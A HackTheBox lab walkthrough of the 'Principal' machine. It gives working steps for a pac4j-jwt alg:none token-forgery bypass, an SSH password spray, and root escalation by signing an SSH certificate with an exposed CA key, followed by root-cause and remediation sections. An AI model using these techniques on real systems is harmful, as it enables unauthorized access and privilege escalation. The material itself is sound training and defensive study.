# Principal — Full Walkthrough Notes

> **Box:** Principal
> **Platform:** HackTheBox
> **Difficulty:** Medium
> **OS:** Linux (Ubuntu 24.04)
> **Target IP:** `<TARGET_IP>`
> **Hostname:** `principal.htb`
> **Author:** Pho3o
> **Machine Author:** ippsec
> **Date:** 11 March 2026

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Foothold — CVE-2026-29000](#3-foothold--cve-2026-29000)
4. [Credential Harvesting](#4-credential-harvesting)
5. [User Access](#5-user-access)
6. [Privilege Escalation — SSH CA Forgery](#6-privilege-escalation--ssh-ca-forgery)
7. [One-Shot Recap](#7-one-shot-recap)
8. [Common Pitfalls](#8-common-pitfalls)
9. [Root Cause Analysis](#9-root-cause-analysis)
10. [Remediation](#10-remediation)
11. [Flags](#11-flags)
12. [Appendices](#12-appendices)

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -sC -sV <TARGET_IP>
```

**Open ports:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22   | open  | SSH     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 |
| 8080 | open  | HTTP    | Jetty — Principal Internal Platform |

**SSH host keys:**

| Algorithm | Fingerprint |
|-----------|-------------|
| ECDSA     | `<REDACTED>` |
| ED25519   | `<REDACTED>` |

**Web fingerprint strings:**

```
http-title: Principal Internal Platform - Login
http-server-header: Jetty
X-Powered-By: pac4j-jwt/6.0.3
Location: /login
```

> 🔑 **Key finding:** `X-Powered-By: pac4j-jwt/6.0.3` → vulnerable to **CVE-2026-29000**.

### 1.2 Hostname Setup

```bash
echo "<TARGET_IP>  principal.htb" | sudo tee -a /etc/hosts
getent hosts principal.htb
```

> ⚠️ **Do not** use `sudo echo "..." >> /etc/hosts` — the `>>` runs as the unprivileged shell. Use `tee -a`.

---

## 2. Web Enumeration

### 2.1 Login Page

| Property | Value |
|----------|-------|
| URL | `http://principal.htb:8080/login` |
| Title | Principal Internal Platform |
| Subtitle | Unified Operations Dashboard |
| Footer | `v1.2.0 \| Powered by pac4j` |
| Auth endpoint | `POST /api/auth/login` |

### 2.2 Client-Side JavaScript

```bash
curl -s http://principal.htb:8080/static/js/app.js
```

**Authentication flow (from JS header):**

| Step | Description |
|------|-------------|
| 1 | User submits credentials to `/api/auth/login` |
| 2 | Server returns encrypted JWT (**JWE**) token |
| 3 | Token stored client-side; sent as `Bearer` for later requests |

**Token handling notes:**

| Aspect | Detail |
|--------|--------|
| Outer layer | JWE-encrypted |
| Encryption alg | `RSA-OAEP-256` |
| Content enc | `A128GCM` |
| Inner JWT | Signed with **RS256** |
| Public key | `/api/auth/jwks` |
| Signing key | **Not** exposed via JWKS |

**JWT claims schema:**

| Claim | Meaning |
|-------|---------|
| `sub` | Username |
| `role` | `ROLE_ADMIN` \| `ROLE_MANAGER` \| `ROLE_USER` |
| `iss` | `"principal-platform"` |
| `iat` | Issued at (epoch) |
| `exp` | Expiration (epoch) |

**Endpoints discovered:**

| Constant | Path |
|----------|------|
| `JWKS_ENDPOINT` | `/api/auth/jwks` |
| `AUTH_ENDPOINT` | `/api/auth/login` |
| `DASHBOARD_ENDPOINT` | `/api/dashboard` |
| `USERS_ENDPOINT` | `/api/users` |
| `SETTINGS_ENDPOINT` | `/api/settings` |

> 🔑 **Key insight:** Tokens are JWE-wrapped with an RS256-signed inner JWT, but the signing key is not published. This is exactly the setup that CVE-2026-29000 exploits.

### 2.3 JWKS Endpoint

```bash
curl -s http://principal.htb:8080/api/auth/jwks | jq
```

**Response (structure):**

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "<REDACTED>"
    }
  ]
}
```

| Field | Value | Note |
|-------|-------|------|
| `kty` | `RSA` | Key type |
| `e` | `AQAB` | Public exponent (65537) |
| `kid` | `enc-key-1` | Encryption key ID |
| `n` | `<REDACTED>` | RSA modulus |

> Only the **encryption** key is exposed — the **signing** key is separate.

---

## 3. Foothold — CVE-2026-29000

### 3.1 Vulnerability Overview

**CVE-2026-29000** — Authentication bypass in `pac4j-jwt` **6.0.3**'s `JwtAuthenticator`.

**Preconditions:** The authenticator must be configured for **both** JWE decryption **and** JWS signature verification.

**Vulnerable flow:**

| Step | Action | Result |
|------|--------|--------|
| 1 | Receive JWE | Decrypt with server RSA private key |
| 2 | Extract inner payload | Call `toSignedJWT()` on it |
| 3 | Inner payload is `PlainJWT` (`{"alg":"none"}`) | `toSignedJWT()` returns **`null`** |
| 4 | Code checks `if (signedJWT != null) { verifySignature(...) }` | Guard is skipped |
| 5 | Signature verification | **Entirely bypassed** |

**Effect:** Envelope is verified, identity claim is not.

### 3.2 Exploit Files

| File | Purpose |
|------|---------|
| `scripts/jwt.py` | CVE-2026-29000 token forgery |
| `scripts/spray.sh` | Password spray |
| `scripts/privesc.sh` | SSH CA cert forgery |

**Environment setup:**

```bash
python3 -m venv ~/venv
source ~/venv/bin/activate
pip install jwcrypto requests
```

> ⚠️ Kali's system pip refuses installs (PEP 668). Use a venv, or pass `--break-system-packages` if supported.

### 3.3 Running the Exploit

```bash
python3 scripts/jwt.py http://principal.htb:8080
```

**Expected output:**

```
[*] Fetching JWKS...
[+] Got RSA public key (kid: enc-key-1)
[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN
[*] Forged JWE token created

[*] Accessing /api/dashboard...
[*] Status: 200
[+] Authenticated as: admin (ROLE_ADMIN)
[+] Token saved to token.txt
```

### 3.4 Critical Implementation Details

| # | Detail | Why it matters |
|---|--------|----------------|
| 1 | `json.dumps(..., separators=(',', ':'))` | Removes whitespace; server parser rejects spaced payloads |
| 2 | Trailing dot on PlainJWT → `header.payload.` | 3-segment JWT required; empty signature slot |

**Failure symptom:** `401 {"error":"Unauthorized","message":"Invalid or expired token"}` — one of the two details above is wrong.

### 3.5 Loading the Token in the Browser

**Option A — Console (fastest):**

1. Open Firefox → `http://principal.htb:8080`
2. F12 → **Console**
3. Run:

```javascript
sessionStorage.setItem('auth_token', '<FORGED_JWT>');
location.reload();
```

**Option B — Storage panel:**

1. F12 → **Storage** → **Session Storage** → `http://<TARGET_IP>:8080`
2. Click **+** → add key `auth_token` with the token value
3. Refresh

**Result:** Land on dashboard as **`admin (ROLE_ADMIN)`**.

---

## 4. Credential Harvesting

### 4.1 Users Tab

| Username | Name | Role | Department | Status |
|----------|------|------|------------|--------|
| admin | Sarah Chen | `ROLE_ADMIN` | IT Security | Active |
| svc-deploy | Deploy Service | deployer | DevOps | Active |
| jthompson | James Thompson | `ROLE_USER` | Engineering | Active |
| amorales | Ana Morales | `ROLE_USER` | Engineering | Active |
| bwright | Benjamin Wright | `ROLE_MANAGER` | Operations | Active |
| kkumar | Kavitha Kumar | `ROLE_ADMIN` | IT Security | Disabled |
| mwilson | Marcus Wilson | `ROLE_USER` | QA | Active |
| lzhang | Lisa Zhang | `ROLE_MANAGER` | Engineering | Active |

**Save to spray list:**

```bash
cat > user.txt <<'EOF'
admin
svc-deploy
jthompson
amorales
bwright
kkumar
mwilson
lzhang
EOF
```

> 🔑 The `svc-deploy` description — *"Service account for automated deployments via SSH certificate auth"* — is a privesc hint.

### 4.2 Settings Tab

| Setting | Value |
|---------|-------|
| authFramework | `pac4j-jwt` |
| authFrameworkVersion | `6.0.3` |
| jwtAlgorithm | `RS256` |
| jweAlgorithm | `RSA-OAEP-256` |
| jweEncryption | `A128GCM` |
| **encryptionKey** | **`<REDACTED>`** |
| tokenExpiry | `3600s` |
| sessionManagement | `stateless` |

> ⚠️ **Shell quoting:** In double quotes, `$$` expands to the current PID. **Always single-quote.**
>
> ```bash
> echo '<REDACTED_PASSWORD>'    # ✅ literal
> echo "<REDACTED_PASSWORD>"    # ❌ PID substituted
> ```

### 4.3 Password Spray

```bash
nxc ssh <TARGET_IP> -u user.txt -p '<REDACTED_PASSWORD>'
```

| Result | Users |
|--------|-------|
| ✅ **Hit** | `svc-deploy` |
| ❌ Fail | admin, jthompson, amorales, bwright, kkumar, mwilson, lzhang |

**Output (sanitized):**

```
SSH  <TARGET_IP>  22  <TARGET_IP>  [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
SSH  <TARGET_IP>  22  <TARGET_IP>  [+] svc-deploy:<REDACTED_PASSWORD>
```

**Install hint (if missing):**

```bash
sudo apt install -y netexec
```

Legacy fallback: `crackmapexec ssh <TARGET_IP> -u user.txt -p '<PASSWORD>'`.

---

## 5. User Access

```bash
ssh svc-deploy@<TARGET_IP>
# Password: <REDACTED_PASSWORD>
```

**Identity:**

```
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

> 🔑 Note membership in the **`deployers`** group.

**Home directory:**

```
total 32
drwxr-x---  4 svc-deploy svc-deploy 4096 .
drwxr-xr-x  3 root       root       4096 ..
-rw-r--r--  1 svc-deploy svc-deploy    0 .bash_history
-rw-r--r--  1 svc-deploy svc-deploy  220 .bash_logout
-rw-r--r--  1 svc-deploy svc-deploy 3771 .bashrc
drwx------  2 svc-deploy svc-deploy 4096 .cache
-rw-r--r--  1 svc-deploy svc-deploy  807 .profile
drwx------  2 svc-deploy svc-deploy 4096 .ssh
-rw-r-----  1 root       svc-deploy   33 user.txt
```

**User flag:**

```
<REDACTED_USER_FLAG>
```

---

## 6. Privilege Escalation — SSH CA Forgery

### 6.1 Enumerating the CA Directory

```bash
ls -la /opt/principal/ssh/
```

| Permissions | Owner | Group | Size | Name |
|-------------|-------|-------|------|------|
| `drwxr-x---` | root | deployers | 4096 | `.` |
| `drwxr-xr-x` | root | root | 4096 | `..` |
| `-rw-r-----` | root | deployers | 288 | `README.txt` |
| `-rw-r-----` | root | deployers | 3381 | **`ca`** ← readable private key |
| `-rw-r--r--` | root | root | 742 | `ca.pub` |

**README contents:**

```
CA keypair for SSH certificate automation.

This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.

Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authentication
```

### 6.2 The Misconfiguration

```bash
cat /etc/ssh/sshd_config.d/60-principal.conf
```

```
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

| Setting | Value | Implication |
|---------|-------|-------------|
| `TrustedUserCAKeys` | `/opt/principal/ssh/ca.pub` | CA is trusted |
| `AuthorizedPrincipalsFile` | **absent** | Any principal claim accepted |
| `AuthorizedPrincipalsCommand` | **absent** | No restriction |
| `PermitRootLogin` | `prohibit-password` | Password root login blocked, but **cert-based root login allowed** |

**Why this is exploitable:**

| Condition | Consequence |
|-----------|-------------|
| `TrustedUserCAKeys` set | Any cert signed by the CA is accepted |
| No `AuthorizedPrincipalsFile` | Cert's principal is matched against login username |
| CA private key readable by `deployers` | We can sign arbitrary certs |
| `PermitRootLogin prohibit-password` | Cert-based root login still permitted |

> Same flaw class as the foothold: envelope is verified, identity claim is trusted.

### 6.3 Forging the Certificate

**All commands run as `svc-deploy` on the target.**

**Step 1 — Generate attacker keypair:**

```bash
ssh-keygen -t ed25519 -f /tmp/pwn -N ""
```

**Step 2 — Sign with CA, principal = root:**

```bash
ssh-keygen -s /opt/principal/ssh/ca \
           -I "pwn-root" \
           -n root \
           -V +1h \
           /tmp/pwn.pub
```

**Flag reference:**

| Flag | Value | Meaning |
|------|-------|---------|
| `-s` | `/opt/principal/ssh/ca` | CA private key |
| `-I` | `"pwn-root"` | Certificate ID (arbitrary label) |
| `-n` | `root` | **Principal** — the identity claim we control |
| `-V` | `+1h` | Validity period |
| (arg) | `/tmp/pwn.pub` | Public key being signed |

**Output:**

```
Signed user key /tmp/pwn-cert.pub: id "pwn-root" serial 0 for root valid from <START> to <END>
```

**Step 3 — Verify:**

```bash
ssh-keygen -L -f /tmp/pwn-cert.pub
```

| Field | Value |
|-------|-------|
| Type | `ssh-ed25519-cert-v01@openssh.com user certificate` |
| Public key | `ED25519-CERT SHA256:<REDACTED>` |
| Signing CA | `RSA SHA256:<REDACTED> (rsa-sha2-512)` |
| Key ID | `"pwn-root"` |
| Serial | `0` |
| Valid | `from <START> to <END>` |
| **Principals** | **`root`** ✅ |
| Critical Options | `(none)` |
| Extensions | `permit-X11-forwarding, permit-agent-forwarding, permit-port-forwarding, permit-pty, permit-user-rc` |

### 6.4 SSH as Root

```bash
chmod 600 /tmp/pwn
ssh -i /tmp/pwn root@localhost
```

**Root shell:**

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
...
root@principal:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:**

```bash
cat /root/root.txt
```

```
<REDACTED_ROOT_FLAG>
```

---

## 7. One-Shot Recap

```bash
# ---------- Foothold ----------
python3 scripts/jwt.py http://principal.htb:8080
# → sessionStorage.setItem('auth_token', '<FORGED_JWT>')

# ---------- Spray ----------
cat > user.txt <<'EOF'
admin
svc-deploy
jthompson
amorales
bwright
kkumar
mwilson
lzhang
EOF

nxc ssh <TARGET_IP> -u user.txt -p '<REDACTED_PASSWORD>'

# ---------- User ----------
ssh svc-deploy@<TARGET_IP>            # <REDACTED_PASSWORD>
cat user.txt

# ---------- Privesc (from svc-deploy shell) ----------
ssh-keygen -t ed25519 -f /tmp/pwn -N ""
ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub
ssh-keygen -L -f /tmp/pwn-cert.pub     # verify Principals: root
chmod 600 /tmp/pwn
ssh -i /tmp/pwn root@localhost
cat /root/root.txt
```

---

## 8. Common Pitfalls

| # | Symptom | Root Cause | Fix |
|---|---------|-----------|-----|
| 1 | `401 Unauthorized` | Missing trailing dot on PlainJWT | Append `.` → `header.payload.` |
| 2 | `401 Unauthorized` | JSON has spaces | `separators=(',', ':')` |
| 3 | `pip install` blocked (PEP 668) | Kali externally-managed env | `python3 -m venv ~/venv && source ~/venv/bin/activate` |
| 4 | Spray fails for all | `$$` expanded to PID | Single-quote the password |
| 5 | `sessionStorage` empty | GUI add failed | Use Console: `sessionStorage.setItem(...)` |
| 6 | SSH rejects forged cert | Wrong principal | `ssh-keygen -L` must show `Principals: root` |
| 7 | SSH rejects private key | `/tmp/pwn` too permissive | `chmod 600 /tmp/pwn` |
| 8 | Cert "not yet valid" | Clock skew | Check `date` on target |
| 9 | Can't read CA key | Not in `deployers` group | `id` — must show `1001(deployers)` |
| 10 | `nxc` missing | Not installed | `sudo apt install -y netexec` |

---

## 9. Root Cause Analysis

### 9.1 Shared Failure Mode

| Layer | Envelope Verified | Identity Claim Ignored |
|-------|-------------------|------------------------|
| **Web (JWT)** | JWE decrypts with server private RSA key | Inner JWT unsigned (`alg: none`) — signature path skipped because `toSignedJWT()` returns `null` |
| **OS (SSH)** | Certificate signature valid against trusted CA pubkey | Principal claim attacker-controlled; no `AuthorizedPrincipalsFile` |

### 9.2 The Pattern

| Step | Web | OS |
|------|-----|-----|
| Outer wrapper verified | JWE decryption ✅ | Cert signature ✅ |
| Inner claim trusted | `sub`, `role` | `principal` |
| Independent validation | ❌ Missing | ❌ Missing |
| Result | Admin forgery | Root forgery |

**Envelope ≠ Identity.** Cryptographic hygiene that verifies *who signed* but not *who the token claims to be* provides no security.

---

## 10. Remediation

### 10.1 Web — CVE-2026-29000

| # | Action |
|---|--------|
| 1 | Upgrade `pac4j-jwt` past 6.0.3 |
| 2 | Reject `alg: none` unconditionally; enforce `alg` allow-list (`RS256`, `ES256`, `EdDSA`, ...) |
| 3 | **Fail closed** on parse errors — `toSignedJWT() == null` must reject the request |
| 4 | Add regression tests: JWE-wrapped unsigned JWT, `alg: none` payloads |
| 5 | Use a hardened JWT library that treats "signed" as mandatory |

### 10.2 OS — SSH CA

| # | Action |
|---|--------|
| 1 | Add `AuthorizedPrincipalsFile` (or `AuthorizedPrincipalsCommand`) |
| 2 | Protect CA private key — root-only, or HSM/offline |
| 3 | Audit `PermitRootLogin` — `prohibit-password` still allows cert-based root |
| 4 | Constrain cert options (`no-port-forwarding`, short TTL) |
| 5 | Log "signature skipped" events |

**Config example:**

```
TrustedUserCAKeys /opt/principal/ssh/ca.pub
AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u
```

`/etc/ssh/auth_principals/root`:

```
admin-principal
ops-principal
```

A cert with `Principals: root` is now accepted **only if** the CA has bound `root` to that principal.

### 10.3 Cross-Cutting Lesson

Every trust decision must be **explicitly bounded** by a policy the verifier controls — never by data inside the token being verified.

---

## 11. Flags

| Flag | Value |
|------|-------|
| **User** | `<REDACTED_USER_FLAG>` |
| **Root** | `<REDACTED_ROOT_FLAG>` |

---

## 12. Appendices

### Appendix A — Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port / service enumeration |
| `curl` + `jq` | API interaction & JSON parsing |
| `jwcrypto` (Python) | JWE construction |
| `requests` (Python) | HTTP client for exploit |
| Firefox DevTools | `sessionStorage` injection |
| NetExec (`nxc`) | SSH password spray |
| `ssh-keygen` | Key generation + cert signing |
| OpenSSH client | Login with forged certificate |

### Appendix B — Files Produced

| File | Description |
|------|-------------|
| `token.txt` | Forged admin JWE |
| `user.txt` | Username list for spray |
| `/tmp/pwn` | Attacker private key (on target) |
| `/tmp/pwn.pub` | Attacker public key (on target) |
| `/tmp/pwn-cert.pub` | Forged root certificate (on target) |

### Appendix C — Attack Timeline

| Phase | Technique | Time |
|-------|-----------|------|
| Recon | Nmap | ~30s |
| Enumeration | JS + JWKS | ~2 min |
| Foothold | CVE-2026-29000 | ~5 min |
| Harvest | Dashboard scrape | ~2 min |
| Pivot | Password spray + SSH | ~1 min |
| Privesc | SSH CA forgery | ~2 min |
| **Total** | — | **~12 min** |

### Appendix D — References

| Resource | Link |
|----------|------|
| CVE-2026-29000 | pac4j-jwt Authentication Bypass |
| pac4j-jwt GitHub | <https://github.com/pac4j/pac4j> |
| `sshd_config(5)` | `TrustedUserCAKeys`, `AuthorizedPrincipalsFile` |
| `ssh-keygen(1)` | Certificate signing options |

---

*Both bugs are the same bug wearing different hats: a system that trusts the wrapper without ever reading the letter inside.*